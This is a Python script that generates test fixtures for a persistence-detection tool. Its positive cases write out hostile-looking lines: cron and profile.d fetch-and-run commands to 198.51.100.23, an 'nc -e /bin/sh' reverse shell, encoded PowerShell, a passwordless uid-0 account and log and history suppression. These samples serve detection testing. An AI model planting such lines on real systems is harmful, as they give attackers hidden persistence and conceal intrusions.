#!/usr/bin/env python3
"""Materialise the benign test fixtures used by the per-check quality gate.

    python testdata/make_fixtures.py

Why a generator rather than hand-placed files:

* Every fixture's INTENT is documented next to its content, so a reviewer can see what each
  case is supposed to prove without reverse-engineering a directory tree.
* Git records only the executable bit, not full POSIX modes. Several criteria depend on
  modes (world-writable unit files, 0600 vs 0666 authorized_keys), so each fixture tree
  carries a `modes.json` manifest that the Go test harness applies when it copies the tree
  to a temp directory. That also makes the fixtures behave identically whether the repo is
  checked out on Windows, on drvfs (/mnt/c, which reports everything as 0777) or on a native
  Linux filesystem.

Everything here is BENIGN. No real malware, no real credential-dumping tooling, no live
payloads -- the "malicious" samples are inert strings that exercise pattern matching.
"""

import json
import os
import shutil
import sys

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")

# fixture tree -> {relative path: octal mode}. Only non-default modes are listed; the Go
# harness defaults to 0644 for files and 0755 for directories.
MODES: dict[str, dict[str, int]] = {}

# fixture tree -> {relative link path: target}. Symlinks cannot be created portably from a
# Windows checkout, and git does not preserve them reliably across platforms, so they are
# declared here and materialised by the Go test harness (which always runs on Linux).
LINKS: dict[str, dict[str, str]] = {}


def link(tree: str, rel: str, target: str) -> None:
    LINKS.setdefault(tree, {})[rel.replace(os.sep, "/")] = target


# fixture tree -> {safe_source_path: real_destination_path}. Some real-world artifact names
# (an all-dots directory, a name ending in trailing dots/spaces) are rejected or silently
# normalised by the Win32 API, which is what this generator runs under. Such paths are
# written under a safe placeholder name and renamed into place by the Go test harness,
# which always runs on Linux and has no such restriction -- the same indirection used for
# symlinks via LINKS/links.json.
RENAMES: dict[str, dict[str, str]] = {}


def renamed_path(tree: str, safe_rel: str, real_rel: str) -> str:
    RENAMES.setdefault(tree, {})[safe_rel.replace(os.sep, "/")] = real_rel.replace(os.sep, "/")
    return safe_rel


def w(tree: str, rel: str, content: str, mode: int | None = None) -> None:
    """Write a fixture file, recording a non-default mode when one is given."""
    path = os.path.join(ROOT, tree, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(content)
    if mode is not None:
        MODES.setdefault(tree, {})[rel.replace(os.sep, "/")] = mode


def wb(tree: str, rel: str, data: bytes) -> None:
    """Write a fixture file as raw bytes (used for UTF-16 Task Scheduler XML)."""
    path = os.path.join(ROOT, tree, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as fh:
        fh.write(data)


def w16(tree: str, rel: str, text: str) -> None:
    """Write UTF-16LE with a BOM, which is how Task Scheduler stores definitions on a real
    host. Exercising the collector's UTF-16 decoding against a realistic encoding matters:
    a UTF-8-only parser silently fails on every real task file."""
    wb(tree, rel, b"\xff\xfe" + text.replace("\n", "\r\n").encode("utf-16-le"))


def empty(tree: str, note: str) -> None:
    """Create a deliberately empty tree, with a README explaining what it proves."""
    path = os.path.join(ROOT, tree)
    os.makedirs(path, exist_ok=True)
    with open(os.path.join(path, "README.txt"), "w", encoding="utf-8", newline="\n") as fh:
        fh.write(note + "\n")


# =========================================================================================
# LNX-PERSIST-SYSTEMD-001
# =========================================================================================

def systemd() -> None:
    t = "lnx-persist-systemd-001/positive"
    # Proves SYSD-C1 (executes from /tmp) AND SYSD-C2 (shadows a vendor unit of the same
    # name), which together must escalate the finding to corroborated.
    w(t, "usr/lib/systemd/system/update-notifier.service", """\
[Unit]
Description=Update notifier (vendor)

[Service]
Type=simple
ExecStart=/usr/libexec/update-notifier --daemon

[Install]
WantedBy=multi-user.target
""")
    w(t, "etc/systemd/system/update-notifier.service", """\
[Unit]
Description=Update notifier

[Service]
Type=simple
ExecStart=/tmp/.update-helper --daemon
Restart=always

[Install]
WantedBy=multi-user.target
""")
    # Enablement is expressed as a plain file in the .wants directory; the collector only
    # reads directory entries, so this models an enabled unit without needing a symlink
    # (which cannot be created portably on a Windows checkout).
    w(t, "etc/systemd/system/multi-user.target.wants/update-notifier.service", "")
    # Proves SYSD-C6: a world-writable unit file means any local user controls the service.
    w(t, "etc/systemd/system/telemetry-collector.service", """\
[Unit]
Description=Telemetry collector

[Service]
ExecStart=/usr/local/bin/telemetry-collector
""", mode=0o666)
    # Realistic surrounding units so the positive tree is not trivially small.
    w(t, "usr/lib/systemd/system/ssh.service", """\
[Unit]
Description=OpenBSD Secure Shell server

[Service]
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
ExecReload=/usr/sbin/sshd -t

[Install]
WantedBy=multi-user.target
""")

    t = "lnx-persist-systemd-001/negative"
    # A realistic distribution unit set. None of the six criteria may fire. This is the
    # case that distinguishes a real check from one that flags the existence of a unit.
    w(t, "usr/lib/systemd/system/ssh.service", """\
[Unit]
Description=OpenBSD Secure Shell server
After=network.target auditd.service

[Service]
EnvironmentFile=-/etc/default/ssh
ExecStartPre=/usr/sbin/sshd -t
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
ExecReload=/usr/sbin/sshd -t
Type=notify

[Install]
WantedBy=multi-user.target
""")
    w(t, "usr/lib/systemd/system/nginx.service", """\
[Unit]
Description=A high performance web server and a reverse proxy server

[Service]
Type=forking
ExecStartPre=/usr/sbin/nginx -t -q -g 'daemon on; master_process on;'
ExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'
ExecReload=/usr/sbin/nginx -g 'daemon on; master_process on;' -s reload
User=root

[Install]
WantedBy=multi-user.target
""")
    w(t, "usr/lib/systemd/system/cron.service", """\
[Unit]
Description=Regular background program processing daemon

[Service]
ExecStart=/usr/sbin/cron -f -P
Restart=on-failure

[Install]
WantedBy=multi-user.target
""")
    w(t, "usr/lib/systemd/system/systemd-timesyncd.service", """\
[Unit]
Description=Network Time Synchronization

[Service]
Type=notify
ExecStart=/usr/lib/systemd/systemd-timesyncd
User=systemd-timesync
""")
    # Third-party software legitimately installed under /opt -- must NOT be flagged, which
    # is why /opt and /usr/local are deliberately absent from the transient-directory list.
    w(t, "etc/systemd/system/vendor-agent.service", """\
[Unit]
Description=Vendor monitoring agent

[Service]
ExecStart=/opt/vendor/bin/agent --config /etc/vendor/agent.conf
Restart=always
User=vendor

[Install]
WantedBy=multi-user.target
""")
    w(t, "usr/lib/systemd/system/logrotate.timer", """\
[Unit]
Description=Daily rotation of log files

[Timer]
OnCalendar=daily
AccuracySec=1h
Persistent=true

[Install]
WantedBy=timers.target
""")
    w(t, "etc/systemd/system/multi-user.target.wants/ssh.service", "")
    w(t, "etc/systemd/system/multi-user.target.wants/nginx.service", "")

    # Regression cases for two false positives found by running against a real host
    # (stock WSL2 Kali), both of which produced findings on a clean machine:
    #
    #   1. A MASKED unit -- symlinked to /dev/null -- is systemd's standard way to DISABLE
    #      a service. It cannot start, so it is the opposite of persistence. Nine of these
    #      exist on stock Kali.
    #   2. An ENABLEMENT symlink in /etc/systemd/system pointing at the vendor unit is
    #      normal systemd behaviour, not an override that shadows the vendor file.
    #
    # Both are also symlinks, whose own mode is ALWAYS lrwxrwxrwx; testing a symlink for
    # world-writability matched all 43 of them. Neither may produce a finding.
    link(t, "etc/systemd/system/NetworkManager.service", "/dev/null")
    link(t, "etc/systemd/system/ssh.service", "/usr/lib/systemd/system/ssh.service")

    empty("lnx-persist-systemd-001/nodata",
          "Deliberately empty: this host has no systemd unit directory at all.\n"
          "Proves the check returns INSUFFICIENT_DATA rather than NOT_DETECTED.\n"
          "Reporting NOT_DETECTED here would tell an analyst that a host which does not\n"
          "even use systemd is free of systemd persistence, which is meaningless.")


# =========================================================================================
# LNX-PERSIST-CRON-001
# =========================================================================================

def cron() -> None:
    t = "lnx-persist-cron-001/positive"
    # PATH prepends a writable directory -> CRON-C5.
    w(t, "etc/crontab", """\
SHELL=/bin/sh
PATH=/tmp/.bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
""")
    # Fetch-and-execute -> CRON-C2. Inert URL, no payload.
    w(t, "etc/cron.d/system-update", """\
# Added by system-update
@reboot root curl -fsSL http://198.51.100.23/bootstrap.sh | sh
""")
    # Decode-and-execute -> CRON-C3. The base64 decodes to the harmless string "id".
    w(t, "etc/cron.d/metrics-helper", """\
*/5 * * * * root echo aWQK | base64 -d | sh
""")
    # Executes a script FROM /tmp -> CRON-C1.
    w(t, "var/spool/cron/crontabs/www-data", """\
0 3 * * * /bin/sh /tmp/.cache/sync.sh
""", mode=0o600)

    t = "lnx-persist-cron-001/negative"
    # An ordinary Debian-family cron population, including the real certbot entry whose
    # `perl -e 'sleep int(rand(43200))'` previously false-positived the encoded-execution
    # pattern, and a monitoring job that WRITES to /tmp without executing from it.
    w(t, "etc/crontab", """\
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
""")
    w(t, "etc/cron.d/certbot", """\
# Renew certificates twice daily with a randomised delay.
0 */12 * * * root test -x /usr/bin/certbot -a \\! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew
""")
    w(t, "etc/cron.d/e2scrub_all", """\
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
""")
    w(t, "etc/cron.d/node-exporter", """\
# Monitoring agent: downloads metrics to a temp file. Writes to /tmp but does not
# EXECUTE from it, so the transient-directory criterion must not fire.
*/5 * * * * nobody curl -s -o /tmp/node-metrics.json http://localhost:9100/metrics
""")
    w(t, "etc/cron.daily/logrotate", """\
#!/bin/sh
test -x /usr/sbin/logrotate || exit 0
/usr/sbin/logrotate /etc/logrotate.conf
""")
    w(t, "etc/cron.daily/man-db", """\
#!/bin/sh
test -x /usr/bin/mandb || exit 0
/usr/bin/mandb --quiet
""")

    empty("lnx-persist-cron-001/nodata",
          "Deliberately empty: no cron implementation is installed on this host.\n"
          "Proves the check returns INSUFFICIENT_DATA rather than a clean bill of health.")


# =========================================================================================
# LNX-PERSIST-SSHKEY-001
# =========================================================================================

# Inert sample keys. These are syntactically well-formed but are not real keys and have no
# corresponding private key anywhere; they exist only to exercise the parser.
KEY_A = ("AAAAC3NzaC1lZDI1NTE5AAAAIK7mLhUxGnbW9mJvEXAMPLEonlyNotARealKeyAAAA")
KEY_B = ("AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyForFixtureUseOnlyNotARealKeyBBBBB")


def sshkeys() -> None:
    t = "lnx-persist-sshkey-001/positive"
    # backup-svc has a nologin shell (SSHK-C2) and a forced-command key (SSHK-C1):
    # two independent criteria, which must escalate to corroborated.
    w(t, "etc/passwd", """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash
backup-svc:x:997:997:Backup service:/var/lib/backup-svc:/usr/sbin/nologin
""")
    w(t, "var/lib/backup-svc/.ssh/authorized_keys",
      'command="/bin/bash -i",no-port-forwarding ssh-ed25519 %s maintenance\n' % KEY_A,
      mode=0o600)
    # A root key in a world-writable file: SSHK-C3 plus SSHK-C4.
    w(t, "root/.ssh/authorized_keys",
      "ssh-ed25519 %s admin@jump\n" % KEY_B, mode=0o666)
    w(t, "home/alice/.ssh/authorized_keys",
      "ssh-ed25519 %s alice@laptop\n" % KEY_A, mode=0o600)

    t = "lnx-persist-sshkey-001/negative"
    # An ordinary interactive user with a correctly permissioned key. No criteria may fire.
    w(t, "etc/passwd", """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash
bob:x:1001:1001:Bob:/home/bob:/bin/bash
""")
    w(t, "home/alice/.ssh/authorized_keys",
      "ssh-ed25519 %s alice@laptop\n" % KEY_A, mode=0o600)
    w(t, "home/bob/.ssh/authorized_keys",
      "# Bob's workstation\nssh-ed25519 %s bob@desktop\n" % KEY_B, mode=0o600)

    empty("lnx-persist-sshkey-001/nodata",
          "Deliberately empty: no /etc/passwd, so users and their home directories cannot\n"
          "be enumerated. Proves the check returns INSUFFICIENT_DATA instead of claiming\n"
          "that no authorized_keys entries exist.")


# =========================================================================================
# WIN-PERSIST-RUNKEY-001
# =========================================================================================

def runkey() -> None:
    # Windows fixtures use the drive letter as the first path component
    # ("C:\\ProgramData\\..." -> "C/ProgramData/..."), which is how collect.RootFS maps a
    # Windows logical path onto a relocatable fixture tree.
    startup = "C/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"

    t = "win-persist-runkey-001/positive"
    # A renamed payload in the Startup folder: non-executable extension -> WRUN-C6.
    # Inert content; this is a text file, not an executable.
    w(t, startup + "/quarterly-report.jpg",
      "inert fixture content - not an executable, not malware\n")
    w(t, startup + "/OneNote.lnk", "inert fixture shortcut placeholder\n")

    t = "win-persist-runkey-001/negative"
    # Only legitimate Startup items. The registry half is supplied by a FakeRegistry in the
    # check's Cases(); see persist_windows.go.
    w(t, startup + "/OneNote.lnk", "inert fixture shortcut placeholder\n")
    w(t, startup + "/desktop.ini", "[.ShellClassInfo]\n")

    empty("win-persist-runkey-001/nodata",
          "Deliberately empty: no Startup folder, and the check's Cases() supplies an\n"
          "UnavailableRegistry. Proves that with no registry to read the check returns\n"
          "INSUFFICIENT_DATA rather than asserting the host is free of Run-key\n"
          "persistence on the basis of never having looked.")


# =========================================================================================
# LNX-DEFIMP-AUDITD-001
# =========================================================================================

def auditd() -> None:
    t = "lnx-defimp-auditd-001/positive"
    # auditd IS installed and configured, but the ruleset has been emptied and the log
    # truncated: AUD-C1 plus AUD-C2 (and AUD-C3 via the trailing -D), which is the
    # genuinely anomalous combination the check exists to find.
    w(t, "etc/audit/auditd.conf", """\
log_file = /var/log/audit/audit.log
log_format = RAW
max_log_file = 8
num_logs = 5
max_log_file_action = ROTATE
disk_full_action = SUSPEND
""")
    w(t, "etc/audit/rules.d/audit.rules", """\
## This file is empty of real rules.
-D
-b 8192
""")
    w(t, "var/log/audit/audit.log", "")

    t = "lnx-defimp-auditd-001/negative"
    # A properly configured audit subsystem with baseline coverage and a populated log.
    w(t, "etc/audit/auditd.conf", """\
log_file = /var/log/audit/audit.log
log_format = RAW
write_logs = yes
max_log_file = 8
num_logs = 5
max_log_file_action = ROTATE
disk_full_action = SUSPEND
""")
    w(t, "etc/audit/rules.d/10-base.rules", """\
-D
-b 8192
-f 1

## Identity and privilege files
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/sudoers -p wa -k scope
-w /etc/sudoers.d -p wa -k scope

## Process execution
-a always,exit -F arch=b64 -S execve -k exec
-a always,exit -F arch=b32 -S execve -k exec
""")
    w(t, "var/log/audit/audit.log", """\
type=DAEMON_START msg=audit(1760000000.001:1): op=start ver=3.1.2 res=success
type=SYSCALL msg=audit(1760000100.123:456): arch=c000003e syscall=59 success=yes comm="bash" key="exec"
type=PATH msg=audit(1760000100.123:456): item=0 name="/usr/bin/id" nametype=NORMAL
type=SYSCALL msg=audit(1760003700.500:901): arch=c000003e syscall=257 success=yes comm="vim" key="identity"
""")

    empty("lnx-defimp-auditd-001/nodata",
          "Deliberately empty: the Linux audit subsystem is not installed at all, which is\n"
          "the common real-world case (and is exactly what WSL2 Kali looks like).\n"
          "This is THE critical path for this check: it must return INSUFFICIENT_DATA.\n"
          "Returning NOT_DETECTED would tell an analyst that a host with no audit\n"
          "subsystem shows no evidence of audit tampering -- technically true and\n"
          "completely misleading.")


# =========================================================================================
# LNX-PERSIST-SHELLRC-001
# =========================================================================================

# A minimal but realistic passwd used by the fixtures that enumerate per-user files.
PASSWD_BASIC = """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash
"""


def shellrc() -> None:
    t = "lnx-persist-shellrc-001/positive"
    w(t, "etc/passwd", PASSWD_BASIC)
    # Fetch-and-execute planted in a system-wide profile drop-in.
    w(t, "etc/profile.d/99-system-health.sh", """\
# System health reporter
export HEALTH_ENDPOINT=https://health.internal.example
curl -fsSL http://198.51.100.23/agent.sh | bash
""")
    # A payload executed from /tmp in a user's own rc file.
    w(t, "home/alice/.bashrc", """\
# ~/.bashrc
[ -z "$PS1" ] && return
alias ll='ls -alF'
/bin/sh /tmp/.cache/.session-helper &
""")

    t = "lnx-persist-shellrc-001/negative"
    w(t, "etc/passwd", PASSWD_BASIC)
    w(t, "etc/profile", """\
# /etc/profile: system-wide .profile file for the Bourne shell
if [ "$(id -u)" -eq 0 ]; then
  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
else
  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
fi
export PATH

if [ "${PS1-}" ]; then
  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  fi
fi

for i in /etc/profile.d/*.sh; do
  if [ -r $i ]; then
    . $i
  fi
done
unset i
""")
    w(t, "etc/profile.d/01-locale-fix.sh", """\
# Set a sane default locale
if [ -z "$LANG" ]; then
  export LANG=C.UTF-8
fi
""")
    w(t, "etc/profile.d/bash_completion.sh", """\
if [ -r /usr/share/bash-completion/bash_completion ]; then
  . /usr/share/bash-completion/bash_completion
fi
""")
    # Developer tooling initialisation -- the single most common legitimate modification
    # of a user's rc file, and a case a naive check would flag.
    w(t, "home/alice/.bashrc", """\
# ~/.bashrc: executed by bash(1) for non-login shells.
case $- in
    *i*) ;;
      *) return;;
esac

HISTCONTROL=ignoreboth
shopt -s histappend
HISTSIZE=1000
HISTFILESIZE=2000

alias ll='ls -alF'
alias grep='grep --color=auto'

export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh"
[ -s "$NVM_DIR/bash_completion" ] && \\. "$NVM_DIR/bash_completion"

export PYENV_ROOT="$HOME/.pyenv"
command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"
eval "$(pyenv init -)"

. "$HOME/.cargo/env"
""")

    empty("lnx-persist-shellrc-001/nodata",
          "Deliberately empty: no shell initialisation file exists anywhere on this host.\n"
          "Proves the check returns INSUFFICIENT_DATA rather than NOT_DETECTED.")


# =========================================================================================
# LNX-PERSIST-RCSCRIPT-001
# =========================================================================================

def rcscript() -> None:
    t = "lnx-persist-rcscript-001/positive"
    w(t, "etc/rc.local", """\
#!/bin/sh -e
# rc.local
/tmp/.systemd-private/update &
exit 0
""")
    w(t, "etc/init.d/network-health", """\
#!/bin/sh
### BEGIN INIT INFO
# Provides:          network-health
### END INIT INFO
nc -e /bin/sh 198.51.100.23 4444 &
""")

    t = "lnx-persist-rcscript-001/negative"
    w(t, "etc/rc.local", """\
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.

exit 0
""")
    w(t, "etc/init.d/ssh", """\
#!/bin/sh
### BEGIN INIT INFO
# Provides:          sshd
# Required-Start:    $remote_fs $syslog
# Default-Start:     2 3 4 5
### END INIT INFO

set -e
test -x /usr/sbin/sshd || exit 0
umask 022

if test -f /etc/default/ssh; then
    . /etc/default/ssh
fi

. /lib/lsb/init-functions

case "$1" in
  start)
        log_daemon_msg "Starting OpenBSD Secure Shell server" "sshd" || true
        start-stop-daemon --start --quiet --oknodo --chuid 0:0 \\
            --pidfile /run/sshd.pid --exec /usr/sbin/sshd -- $SSHD_OPTS
        ;;
  stop)
        start-stop-daemon --stop --quiet --oknodo --pidfile /run/sshd.pid
        ;;
esac
exit 0
""")
    w(t, "etc/init.d/cron", """\
#!/bin/sh
### BEGIN INIT INFO
# Provides:          cron
### END INIT INFO
. /lib/lsb/init-functions
case "$1" in
  start)  start-stop-daemon --start --quiet --pidfile /run/crond.pid --name cron --startas /usr/sbin/cron -- -P ;;
  stop)   start-stop-daemon --stop --quiet --pidfile /run/crond.pid --name cron ;;
esac
exit 0
""")

    empty("lnx-persist-rcscript-001/nodata",
          "Deliberately empty: a pure-systemd host with no rc.local and no /etc/init.d.\n"
          "Proves the check returns INSUFFICIENT_DATA. This is a common real case, and the\n"
          "systemd check carries the persistence coverage on such a host.")


# =========================================================================================
# LNX-PERSIST-ACCOUNT-001
# =========================================================================================

def accounts() -> None:
    t = "lnx-persist-account-001/positive"
    # "sysupdate" is a second uid-0 account (ACCT-C1) with an EMPTY password (ACCT-C2).
    w(t, "etc/passwd", """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash
sysupdate:x:0:0:System Update Service:/root:/bin/bash
""")
    # Password fields only. These are fixture values, not real hashes: "!" means locked,
    # "$6$..." is a syntactically shaped placeholder, "" means NO PASSWORD REQUIRED.
    w(t, "etc/shadow", """\
root:!:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
www-data:*:19000:0:99999:7:::
alice:$6$FIXTUREONLYnotarealhash$placeholder:19000:0:99999:7:::
sysupdate::19000:0:99999:7:::
""", mode=0o640)
    w(t, "etc/group", """\
root:x:0:
daemon:x:1:
sudo:x:27:alice
www-data:x:33:
alice:x:1000:
""")

    t = "lnx-persist-account-001/negative"
    # A realistic, clean account set: a human admin in sudo (uid >= 1000, interactive),
    # and service accounts that are nologin and NOT in privileged groups.
    w(t, "etc/passwd", """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
postgres:x:102:105:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
alice:x:1000:1000:Alice Admin:/home/alice:/bin/bash
bob:x:1001:1001:Bob:/home/bob:/bin/bash
""")
    w(t, "etc/shadow", """\
root:!:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
bin:*:19000:0:99999:7:::
sys:*:19000:0:99999:7:::
sync:*:19000:0:99999:7:::
www-data:*:19000:0:99999:7:::
sshd:*:19000:0:99999:7:::
systemd-network:*:19000:0:99999:7:::
postgres:*:19000:0:99999:7:::
alice:$6$FIXTUREONLYnotarealhash$placeholder:19000:0:99999:7:::
bob:$6$FIXTUREONLYnotarealhash$placeholder:19000:0:99999:7:::
""", mode=0o640)
    w(t, "etc/group", """\
root:x:0:
daemon:x:1:
sudo:x:27:alice
www-data:x:33:
adm:x:4:
postgres:x:105:
alice:x:1000:
bob:x:1001:
""")

    empty("lnx-persist-account-001/nodata",
          "Deliberately empty: no /etc/passwd, so no account database exists to examine.\n"
          "Proves the check returns INSUFFICIENT_DATA rather than 'no suspicious accounts'.")


# =========================================================================================
# WIN-PERSIST-SERVICE-001
# =========================================================================================

def winservice() -> None:
    # The service check reads only the registry, which the check's Cases() supplies via a
    # FakeRegistry. The fixture trees exist so the filesystem root is valid.
    for case, note in [
        ("positive", "Service data comes from the FakeRegistry in persist_win2.go "
                     "(ProgramData rundll32 service + hijacked svchost ServiceDll)."),
        ("negative", "Service data comes from the FakeRegistry in persist_win2.go "
                     "(stock spoolsv, svchost services with System32 ServiceDlls, a "
                     "driver and an Edge updater)."),
        ("nodata", "No registry is supplied, so the check must return INSUFFICIENT_DATA."),
    ]:
        empty("win-persist-service-001/" + case, note)


# =========================================================================================
# WIN-PERSIST-SCHTASK-001
# =========================================================================================

TASKS = "C/Windows/System32/Tasks"


def _task_xml(author, userid, runlevel, hidden, command, arguments, trigger="LogonTrigger"):
    return """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2026-10-01T09:14:22</Date>
    <Author>%s</Author>
    <URI>\\%s</URI>
  </RegistrationInfo>
  <Triggers>
    <%s>
      <Enabled>true</Enabled>
    </%s>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>%s</UserId>
      <RunLevel>%s</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
    <Hidden>%s</Hidden>
    <AllowStartOnDemand>true</AllowStartOnDemand>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
""" % (author, author, trigger, trigger, userid, runlevel,
       "true" if hidden else "false", command, arguments)


def schtask() -> None:
    t = "win-persist-schtask-001/positive"
    # Hidden + SYSTEM + encoded PowerShell staged in %TEMP%: TASK-C1, C2 and C3.
    # The base64 blob is inert filler, not a real payload.
    w16(t, TASKS + "/SystemHealthCheck", _task_xml(
        author="Microsoft Corporation",
        userid="S-1-5-18", runlevel="HighestAvailable", hidden=True,
        command="powershell.exe",
        arguments="-NoProfile -WindowStyle Hidden -EncodedCommand "
                  "SQBOAEUAUgBUAEYASQBYAFQAVQBSAEUAQgBMAE8AQgBOAE8AVABSAEUAQQBMAA== "
                  "-File C:\\Users\\admin\\AppData\\Local\\Temp\\health.ps1"))

    t = "win-persist-schtask-001/negative"
    # The decisive negative cases: Microsoft's OWN maintenance tasks are hidden AND run as
    # SYSTEM. A check that fires on "hidden" or on "SYSTEM" alone flags a stock install.
    w16(t, TASKS + "/Microsoft/Windows/UpdateOrchestrator/Schedule Scan", _task_xml(
        author="Microsoft Corporation",
        userid="S-1-5-18", runlevel="HighestAvailable", hidden=True,
        command="%systemroot%\\system32\\usoclient.exe", arguments="StartScan",
        trigger="TimeTrigger"))
    w16(t, TASKS + "/Microsoft/Windows/Defrag/ScheduledDefrag", _task_xml(
        author="Microsoft Corporation",
        userid="S-1-5-18", runlevel="LeastPrivilege", hidden=True,
        command="%windir%\\system32\\defrag.exe", arguments="-c -h -o -$",
        trigger="CalendarTrigger"))
    # A real third-party updater: Program Files path, not hidden.
    w16(t, TASKS + "/MicrosoftEdgeUpdateTaskMachineCore", _task_xml(
        author="Microsoft Corporation",
        userid="S-1-5-18", runlevel="HighestAvailable", hidden=False,
        command="C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
        arguments="/c", trigger="CalendarTrigger"))
    # A task that merely WRITES a log into %TEMP% -- must not match TASK-C1, because the
    # criterion is about executing from a staging directory, not writing to one.
    w16(t, TASKS + "/VendorAgent/CollectDiagnostics", _task_xml(
        author="Example Vendor Ltd",
        userid="S-1-5-18", runlevel="LeastPrivilege", hidden=False,
        command="C:\\Program Files\\ExampleVendor\\agent.exe",
        arguments="--collect --out C:\\Windows\\Temp\\vendor-diag.log",
        trigger="CalendarTrigger"))

    empty("win-persist-schtask-001/nodata",
          "Deliberately empty: no Task Scheduler folder exists.\n"
          "Proves the check returns INSUFFICIENT_DATA rather than reporting a Windows host\n"
          "as free of scheduled-task persistence on the basis of never having looked.")


# =========================================================================================
# LNX-DEFIMP-HISTORY-001
# =========================================================================================

def history() -> None:
    t = "lnx-defimp-history-001/positive"
    w(t, "etc/passwd", PASSWD_BASIC)
    # HISTFILE=/dev/null in a profile.d drop-in: HIST-C1.
    w(t, "etc/profile.d/99-privacy.sh", """\
# Suppress command history for all users
export HISTFILE=/dev/null
""")
    # HISTSIZE=0 in the same file set, as a second independent signal: HIST-C2.
    w(t, "etc/profile.d/98-noshist.sh", """\
export HISTSIZE=0
export HISTFILESIZE=0
""")

    t = "lnx-defimp-history-001/negative"
    w(t, "etc/passwd", PASSWD_BASIC)
    # The REAL stock Kali/Debian .bashrc content, including the comment that previously
    # false-positived an unanchored pattern.
    w(t, "home/alice/.bashrc", """\
# ~/.bashrc: executed by bash(1) for non-login shells.
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize
""")
    w(t, "etc/profile", """\
if [ "$(id -u)" -eq 0 ]; then
  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
else
  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
fi
export PATH
""")

    empty("lnx-defimp-history-001/nodata",
          "Deliberately empty: no shell initialisation file exists on this host.\n"
          "Proves the check returns INSUFFICIENT_DATA rather than NOT_DETECTED.")


# =========================================================================================
# LNX-STEALTH-LOGSINK-001
# =========================================================================================

def logsink() -> None:
    t = "lnx-stealth-logsink-001/positive"
    w(t, "var/log/syslog", "placeholder\n")
    link(t, "var/log/auth.log", "/dev/null")
    link(t, "var/log/audit", "/tmp/.nowhere")

    t = "lnx-stealth-logsink-001/negative"
    # Exactly the shape measured on the real host: several legitimately zero-byte logs,
    # one zero-byte log with a POPULATED rotated sibling, and a genuine README symlink.
